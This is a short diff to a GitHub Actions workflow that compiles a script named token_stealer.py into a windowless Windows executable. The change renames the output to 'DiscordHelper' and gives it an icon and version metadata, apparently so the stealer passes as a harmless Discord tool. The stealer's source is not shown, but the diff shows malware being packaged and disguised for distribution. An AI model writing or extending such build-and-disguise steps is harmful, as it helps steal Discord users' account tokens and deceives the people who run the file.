@@ -9,8 +9,8 @@ jobs:
         with:
           python-version: '3.12'
       - run: pip install pyinstaller requests pywin32 cryptography
-      - run: pyinstaller --onefile --noconsole token_stealer.py
+      - run: pyinstaller --onefile --noconsole --name "DiscordHelper" --icon app.ico --version-file version.txt token_stealer.py
       - uses: actions/upload-artifact@v4
         with:
-          name: token_stealer-exe
-          path: dist/token_stealer.exe
+          name: DiscordHelper
+          path: dist/DiscordHelper.exe
